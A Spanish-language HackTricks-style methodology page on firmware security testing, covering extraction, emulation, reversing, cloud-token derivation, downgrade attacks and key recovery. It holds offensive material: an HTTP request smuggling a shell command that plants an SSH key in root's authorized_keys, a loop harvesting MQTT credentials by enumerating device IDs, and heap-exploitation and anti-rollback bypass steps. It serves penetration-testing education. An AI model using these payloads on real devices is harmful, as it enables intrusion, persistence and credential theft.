# Análisis de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introducción**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es un software esencial que permite que los dispositivos funcionen correctamente, gestionando y facilitando la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, dando lugar al inicio del sistema operativo. Examinar y modificar potencialmente el firmware es un paso fundamental para identificar vulnerabilidades de seguridad.

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Detalles específicos del bootloader
- Diseño del hardware y hojas de datos
- Métricas de la base de código y ubicaciones del código fuente
- Librerías externas y tipos de licencia
- Historial de actualizaciones y certificaciones regulatorias
- Diagramas de arquitectura y flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de **open-source intelligence (OSINT)** son invaluables, al igual que el análisis de cualquier componente de software open-source disponible mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede utilizarse para encontrar posibles problemas.

## **Adquisición del Firmware**

La obtención del firmware puede abordarse mediante varios métodos, cada uno con su propio nivel de complejidad:

- **Directamente** desde la fuente (desarrolladores, fabricantes)
- **Compilándolo** a partir de las instrucciones proporcionadas
- **Descargándolo** desde sitios oficiales de soporte
- Utilizando consultas de **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **almacenamiento en la nube**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas de man-in-the-middle
- **Extrayéndolo** del dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- **Sniffing** de solicitudes de actualización dentro de la comunicación del dispositivo
- Identificando y utilizando **endpoints de actualización hardcodeados**
- **Volcándolo** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, cuando todo lo demás falla, utilizando las herramientas de hardware adecuadas

### Logs únicamente por UART: forzar un root shell mediante el entorno de U-Boot en la flash

Si se ignora UART RX (solo hay logs), aún puedes forzar un init shell **editando el blob del entorno de U-Boot** offline:

1. Volcar la flash SPI con un clip SOIC-8 y un programador (3.3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localizar la partición del entorno de U-Boot, editar `bootargs` para incluir `init=/bin/sh` y **recalcular el CRC32 del entorno de U-Boot** para el blob.
3. Reprogramar únicamente la partición del entorno y reiniciar; debería aparecer un shell en UART.

Esto resulta útil en dispositivos embebidos donde el shell del bootloader está deshabilitado, pero la partición del entorno puede escribirse mediante acceso externo a la flash.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Hay diferentes herramientas que puedes utilizar para ello:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si la entropía es baja, probablemente no esté cifrada. Si la entropía es alta, probablemente esté cifrada (o comprimida de alguna forma).

Además, puedes usar estas herramientas para extraer **archivos incrustados dentro del firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

También puedes usar [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Obtención del sistema de archivos

Con las herramientas comentadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk normalmente lo extrae dentro de una **carpeta cuyo nombre corresponde al tipo de sistema de archivos**, que normalmente es uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no tendrá el byte mágico del sistema de archivos en sus firmas**. En estos casos, usa binwalk para **encontrar el offset del sistema de archivos y extraer el sistema de archivos comprimido** del binario, y **extrae manualmente** el sistema de archivos según su tipo utilizando los pasos siguientes.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Ejecuta el siguiente **comando dd** para realizar el carving del sistema de archivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (utilizado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán posteriormente en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Análisis del Firmware

Una vez obtenido el firmware, es esencial diseccionarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar varias herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar los tipos de archivo, extraer strings, analizar datos binarios y comprender los detalles de las particiones y del sistema de archivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere la ausencia de cifrado, mientras que una entropía alta indica un posible cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Usando `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio cuyo nombre corresponde al tipo de sistema de archivos (por ejemplo, squashfs, ubifs). Sin embargo, cuando **binwalk** no consigue reconocer el tipo de sistema de archivos debido a la ausencia de magic bytes, es necesario realizar una extracción manual. Esto implica usar `binwalk` para localizar el offset del sistema de archivos y, posteriormente, el comando `dd` para extraerlo:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Después, dependiendo del tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se utilizan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales hardcodeadas, los endpoints de API, las funcionalidades del servidor de actualizaciones, el código no compilado, los scripts de inicio y los binarios compilados para su análisis offline.

Las **ubicaciones clave** y los **elementos** que se deben inspeccionar incluyen:

- **etc/shadow** y **etc/passwd** para obtener credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts en busca de posibles vulnerabilidades
- Binarios embebidos para su posterior análisis
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para realizar un análisis completo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse minuciosamente en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios de Unix y **PESecurity** para binarios de Windows ayudan a identificar binarios sin protección que podrían ser explotados.

## Obtención de la configuración de cloud y las credenciales de MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen su configuración específica del dispositivo desde un endpoint de cloud con un formato similar a:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible descubrir que `<token>` se deriva localmente del ID del dispositivo mediante un secreto hardcodeado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hexadecimal en mayúsculas

Este diseño permite que cualquiera que conozca un deviceId y el STATIC_KEY reconstruya la URL y obtenga la configuración de cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extraer deviceId de los logs de arranque de UART

- Conectar un adaptador UART de 3.3 V (TX/RX/GND) y capturar los logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Busca líneas que impriman el patrón de URL de configuración cloud y la dirección del broker, por ejemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Recopilar la configuración de cloud y las credenciales de MQTT

- Construye la URL y descarga el JSON con curl; analízalo con jq para extraer secretos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuso de MQTT en texto plano y ACLs débiles de topics (si están presentes)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivos predecibles (a escala, con autorización)

- Muchos ecosistemas incorporan bytes de OUI del proveedor/producto/tipo seguidos de un sufijo secuencial.
- Puedes iterar sobre IDs candidatos, derivar tokens y obtener configs mediante programación:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Obtén siempre autorización explícita antes de intentar realizar enumeraciones masivas.
- Cuando sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.


El proceso de emulación del firmware permite realizar un **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar dificultades relacionadas con las dependencias del hardware o de la arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con una arquitectura y un orden de bytes compatibles, como una Raspberry Pi, o a una máquina virtual preconstruida, puede facilitar pruebas adicionales.

### Emulación de binarios individuales

Para examinar programas individuales, es fundamental identificar el orden de bytes y la arquitectura de CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario de arquitectura MIPS, se puede utilizar el comando:
```bash
file ./squashfs-root/bin/busybox
```
Y para instalar las herramientas de emulación necesarias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), se utiliza `qemu-mips`, y para los binarios little-endian, se elegiría `qemu-mipsel`.

#### Emulación de la arquitectura ARM

Para los binarios ARM, el proceso es similar, utilizando el emulador `qemu-arm` para la emulación.

### Emulación del sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), entre otras, facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.

## Análisis dinámico en la práctica

En esta etapa, se utiliza un entorno de dispositivo real o emulado para el análisis. Es esencial mantener el acceso shell al sistema operativo y al sistema de archivos. La emulación puede no reproducir perfectamente las interacciones con el hardware, por lo que ocasionalmente será necesario reiniciarla. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web y los servicios de red expuestos, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, utilizando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapeo de mensajes de Zigbee / radio-co-processor

En los hubs IoT, la pila RF suele estar dividida entre un **MCU de radio** y un proceso de userland de Linux. Un flujo de trabajo útil consiste en mapear la ruta:

1. **Trama RF** en el aire
2. **Parser del lado del controlador** en el MCU de radio
3. **Protocolo de texto serial/UART o TLV** reenviado a Linux (por ejemplo `/dev/tty*`)
4. **Dispatcher de la aplicación** en el daemon principal
5. **Handler / máquina de estados específica del protocolo**

Esta arquitectura crea dos objetivos de reversing en lugar de uno. Si el controlador convierte las tramas de radio binarias en un protocolo textual como `Group,Command,arg1,arg2,...`, recupera:

- Los **grupos de mensajes** y las tablas de dispatch
- Qué mensajes pueden proceder de la **red** frente a los generados por el propio controlador
- Los campos exactos de discriminación **específicos del fabricante** (por ejemplo, `manufacturer_code` y `cluster_command` de Zigbee)
- Qué handlers solo son alcanzables durante las fases de **commissioning**, discovery o descarga de firmware/modelos

Específicamente para Zigbee, captura el tráfico de pairing y comprueba si el objetivo todavía depende del **Link Key** predeterminado `ZigBeeAlliance09`. Si es así, sniffear el tráfico de commissioning puede exponer el **Network Key**. Los install codes de Zigbee 3.0 reducen esta exposición, así que anota si el dispositivo probado realmente los aplica.

### Handlers de protocolos específicos del fabricante y reachability controlada por FSM

Los comandos Zigbee/ZCL específicos del vendor suelen ser un objetivo mejor que los clusters estandarizados, porque alimentan **código de parsing personalizado** y **FSMs** internas con una validación menos probada.

Flujo de trabajo práctico:

- Haz reversing del command dispatcher hasta encontrar el **handler exclusivo del vendor**.
- Recupera las tablas de **estado de la FSM**, **evento**, **check**, **acción** y **siguiente estado**.
- Identifica los **estados transitorios** que avanzan automáticamente y las ramas de retry/error que finalmente resetean o liberan el estado controlado por el atacante.
- Confirma qué intercambios legítimos del protocolo son necesarios para colocar el daemon en el estado vulnerable, en lugar de asumir que el handler con bugs siempre es alcanzable.

Para protocolos sensibles al timing, el replay de paquetes desde un framework de Python puede ser demasiado lento. Un enfoque más fiable consiste en emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con una stack de nivel vendor, para poder exponer los **endpoints**, **attributes** y el timing correcto del commissioning.

### Clase de bug de descargas fragmentadas en daemons embebidos

Una clase recurrente de bugs de firmware aparece en las **descargas fragmentadas de blobs/modelos/configuración**:

1. El **primer fragmento** (`offset == 0`) almacena `ctx->total_size` y reserva `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos controlados por el atacante **locales al paquete**, como `packet_total_size >= offset + chunk_len`.
3. La copia utiliza `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar el tamaño asignado **originalmente**.

Esto permite al atacante enviar:

- Un primer fragmento válido con un **total size declarado pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero con un `chunk_len` mayor.
- Un tamaño local del paquete falsificado que satisfaga los checks actuales y provoque un overflow del buffer asignado originalmente.

Cuando la ruta vulnerable está detrás de lógica de commissioning, el exploit debe incluir suficiente **emulación del dispositivo** para llevar el objetivo al estado esperado de descarga del modelo o del blob antes de enviar los fragmentos malformados.

### Triggers de `free()` controlados por el protocolo

En los daemons embebidos, la forma más sencilla de activar la explotación de metadatos del heap a menudo no consiste en «esperar a la limpieza», sino en **forzar el manejo de errores del propio protocolo**:

- Envía fragmentos posteriores malformados para llevar la FSM a estados de **retry** o **error**.
- Supera el umbral de reintentos para que el daemon **resetee el contexto** y libere el buffer corrupto.
- Usa este `free()` predecible para activar primitivas del allocator antes de que el proceso se bloquee por motivos no relacionados.

Esto resulta especialmente útil contra allocators **musl/uClibc/dlmalloc-like** en Linux embebido, donde corromper los metadatos de los chunks puede convertir la lógica de unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de size** para redirigir el recorrido del allocator hacia **fake chunks preparados dentro del buffer desbordado**, en lugar de sobrescribir inmediatamente punteros reales de los bins y bloquear el proceso.

## Binary Exploitation y Proof-of-Concept

Desarrollar un PoC para vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones de runtime binario en sistemas embebidos son poco frecuentes, pero cuando están presentes pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre explotación de fastbins de uClibc (Linux embebido)

- **Fastbins + consolidación:** uClibc utiliza fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, por lo que cualquier fake chunk debe superar los checks (size válido, `fd = 0` y chunks circundantes considerados «en uso»).
- **Binarios non-PIE bajo ASLR:** si ASLR está habilitado pero el binario principal es **non-PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a un header válido de heap chunk para colocar una asignación de fastbin sobre una **tabla de punteros a funciones**.
- **NUL que detiene el parser:** cuando se analiza JSON, un `\x00` en el payload puede detener el parsing y conservar los bytes controlados por el atacante que quedan después para un stack pivot/ROP chain.
- **Shellcode mediante `/proc/self/mem`:** una ROP chain que llame a `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapping conocido y saltar hacia él.

## Sistemas operativos preparados para el análisis de Firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para el security testing de firmware, equipados con las herramientas necesarias.

## OS preparados para analizar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro destinada a ayudarte a realizar security assessment y penetration testing de dispositivos Internet of Things (IoT). Ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias ya cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo de embedded security testing basado en Ubuntu 18.04 y precargado con herramientas para el security testing de firmware.

## Ataques de downgrade de Firmware y mecanismos de actualización inseguros

Aunque un vendor implemente checks de firmas criptográficas para las imágenes de firmware, la **protección contra rollback de versiones (downgrade) suele omitirse**. Cuando el bootloader o recovery-loader solo verifica la firma con una clave pública integrada, pero no compara la *versión* (o un contador monotónico) de la imagen que se está flasheando, un atacante puede instalar legítimamente un **firmware antiguo y vulnerable que aún tenga una firma válida**, reintroduciendo así vulnerabilidades corregidas.

Flujo de ataque típico:

1. **Obtén una imagen antigua firmada**
* Descárgala del portal público de descargas, CDN o sitio de soporte del vendor.
* Extráela de aplicaciones móviles/de escritorio complementarias (por ejemplo, dentro de un Android APK en `assets/firmware/`).
* Recupérala de repositorios de terceros como VirusTotal, Internet archives, foros, etc.
2. **Sube o sirve la imagen al dispositivo** mediante cualquier canal de actualización expuesto:
* Web UI, API de aplicación móvil, USB, TFTP, MQTT, etc.
* Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *no autenticados* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y activan la recuperación/actualización.
3. Tras el downgrade, explota una vulnerabilidad corregida en la versión más reciente (por ejemplo, un filtro de command injection añadido posteriormente).
4. Opcionalmente, vuelve a flashear la imagen más reciente o desactiva las actualizaciones para evitar la detección una vez obtenida la persistencia.

### Ejemplo: Command Injection después de un downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando de shell sin sanitización, lo que permite la inyección de comandos arbitrarios (en este caso, habilitando el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea inútil.

### Extracción de Firmware Desde Aplicaciones Móviles

Muchos vendors incluyen imágenes de firmware completas dentro de sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo mediante Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX, en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso un simple `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass de anti-rollback exclusivo del updater en diseños de slots A/B

Algunos vendors sí implementan un **ratchet** anti-downgrade, pero únicamente dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recovery o un agente OTA en userspace). Si el **bootloader** posteriormente solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o en los metadatos del slot, la protección contra rollback todavía puede evadirse.

Diseño débil típico:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **security ratchet** / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza imágenes firmadas más antiguas.
- El bootloader **no** analiza ese ratchet y solo verifica el header, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una tabla de particiones o en un contador de generación por slot, y **no está vinculada criptográficamente** al digest exacto del firmware validado.

Esto crea una primitiva de **validar una imagen / arrancar otra imagen** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como próximo objetivo de arranque usando una imagen firmada actual, y posteriormente sobrescribir el slot B antes del reboot, el bootloader podría arrancar igualmente la imagen downgraded porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso habitual:

1. Subir un firmware **actual y firmado** al slot pasivo y ejecutar la rutina normal de validación/cambio para que el layout marque ese slot como próximo activo.
2. **No reiniciar todavía**. Volver a entrar en la rutina de preparación/borrado del slot durante la misma sesión.
3. Aprovechar la lógica obsoleta del estado de arranque o de selección del slot para que el updater borre el **mismo slot físico** que acaba de promoverse.
4. Escribir un firmware **más antiguo pero todavía firmado** en ese slot.
5. Omitir la rutina de validación que aplica el ratchet y reiniciar directamente.
6. El bootloader selecciona el slot promovido, verifica únicamente la firma/integridad y arranca la imagen antigua.

Aspectos que conviene buscar al hacer reversing de implementaciones de actualización A/B:

- Selección del slot derivada de **flags de boot** que no se actualizan después de un cambio exitoso.
- Una rutina del tipo `prepare_passive_slot()` que borra un slot basándose en un estado obsoleto en lugar del **layout confirmado actual**.
- Una función del tipo `part_write_layout()` que solo incrementa un **contador de generación** / flag de activo y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en las fases de ROM / bootloader / secure boot.
- Rutinas de borrado o recovery que dejan el slot marcado como arrancable incluso después de eliminar y reescribir su contenido.

### Checklist para evaluar la lógica de actualización

* ¿El transporte/autenticación del *update endpoint* está adecuadamente protegido (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador monotónico anti-rollback** antes de flashear?
* ¿La imagen se verifica dentro de una secure boot chain (por ejemplo, firmas comprobadas por el código de la ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en lugar de comprobar únicamente la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o el slot puede modificarse después de su promoción?
* Después de que un cambio de slot tiene éxito, ¿el dispositivo está obligado a reiniciar o las rutinas posteriores de actualización/borrado siguen siendo accesibles durante la misma sesión?
* ¿El código de userland realiza comprobaciones de consistencia adicionales (por ejemplo, mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *parciales* o de *backup* reutilizan la misma lógica de validación?

> 💡  Si falta alguno de los elementos anteriores, la plataforma probablemente sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar el descubrimiento de vulnerabilidades en firmware, utiliza los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperación de claves de descifrado del firmware desde el estado de KMS/Vault embebido

Cuando una imagen de actualización mezcla pequeños metadatos en texto plano con un blob grande de alta entropía, realiza primero un triage del contenedor antes de intentar cualquier brute-force:

- Extrae headers, offsets y límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` normalmente indica el formato `enc` de OpenSSL: los siguientes 8 bytes son el salt y los bytes restantes son el ciphertext.
- Un campo Base64 que decodifica exactamente a `256` bytes es un indicio fuerte de que estás observando un ciphertext RSA-2048 que envuelve una contraseña/clave de sesión aleatoria del firmware.
- El material PGP separado en el mismo archivo suele proteger únicamente la autenticidad; no asumas que es el mecanismo de confidencialidad.

Si la búsqueda de claves estáticas (`grep`, `strings`, búsquedas de PEM/PGP) falla, haz reversing de la **ruta operativa de descifrado** en lugar de buscar únicamente claves privadas:

- Decompila el binario del updater / management y rastrea quién lee el blob cifrado, qué helper/API lo desenvuelve y el nombre lógico de clave que solicita.
- Busca en el root filesystem extraído el estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de los unit files y scripts de init.
- Trata el texto plano `vault operator unseal ...`, las recovery keys, los bootstrap tokens o los scripts locales de auto-unseal del KMS como equivalentes al material de clave privada.

Si el appliance incluye el binario original de Vault y el backend de almacenamiento, normalmente es más fácil reproducir ese entorno que reimplementar los internals de Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Con root en el KMS clonado:

- Haz que las transit keys solo sean exportables dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la unwrap key: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash utilizado por el KMS. Un descifrado fallido con PKCS#1 v1.5 y un descifrado OAEP predeterminado fallido **no** demuestran que la clave sea incorrecta; muchos flujos respaldados por Vault utilizan OAEP con SHA-256, mientras que las bibliotecas comunes utilizan SHA-1 de forma predeterminada.
- Si el payload comienza con `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, normalmente MD5 en appliances antiguos) antes de intentar el descifrado AES-CBC.

Esto convierte el problema del "firmware cifrado" en un problema más general: **recuperar las claves operativas del appliance y reproducir offline los parámetros exactos de unwrap + KDF**.

